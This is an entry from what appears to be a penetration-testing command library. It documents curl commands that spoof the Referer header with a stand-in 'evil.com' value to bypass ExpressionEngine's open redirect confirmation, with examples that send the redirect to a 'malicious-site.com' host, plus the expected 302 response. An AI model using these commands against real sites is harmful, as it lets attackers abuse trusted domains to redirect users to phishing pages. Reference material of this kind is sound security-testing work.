---
data: >-
  curl -v -e "http://evil.com?http://target.com"
  "http://target.com/PATH_TO_EE/index.php?URL=https://www.example.com"
tags:
  - web
  - bypass
  - redirect
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:26.282Z'
id: e5111903-11cb-4ac9-9281-8f58eee2dfb2
verified: false
validated: true
submitted: true
---
# curl-set-referer-for-redirect-bypass

## Command

```bash
curl -v -e "http://evil.com?http://target.com" "http://target.com/PATH_TO_EE/index.php?URL=https://www.example.com"
```

## Description

This curl command tests the ExpressionEngine open redirect bypass by setting a malicious Referer header that includes the target hostname as a substring, exploiting stristr validation to force a direct redirect without confirmation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-v` | Verbose mode to show headers and response details | No |
| `-e, --referer` | Sets the Referer header (e.g., "http://evil.com?http://target.com") | Yes |
| URL argument | The target redirect endpoint (e.g., "http://target.com/index.php?URL=https://example.com") | Yes |

## Examples

### Basic Usage

```bash
curl -e "http://evil.com?http://target.com" -I "http://target.com/index.php?URL=https://example.com"
```

### Advanced Usage

```bash
curl -v -e "http://attacker.com/path?host=target.com" "http://target.com/PATH_TO_EE/index.php?URL=https://malicious-site.com" -H "User-Agent: Mozilla/5.0"
```

## Expected Output

Successful execution shows a 302 Found response with Location header pointing directly to the external URL, e.g.,

< HTTP/1.1 302 Found
< Location: https://www.example.com

No confirmation page or block; verbose mode reveals the Referer was sent and matched.

## Related

- [[procedures/Bypass-ExpressionEngine-Open-Redirect-via-Referer-Substring]]
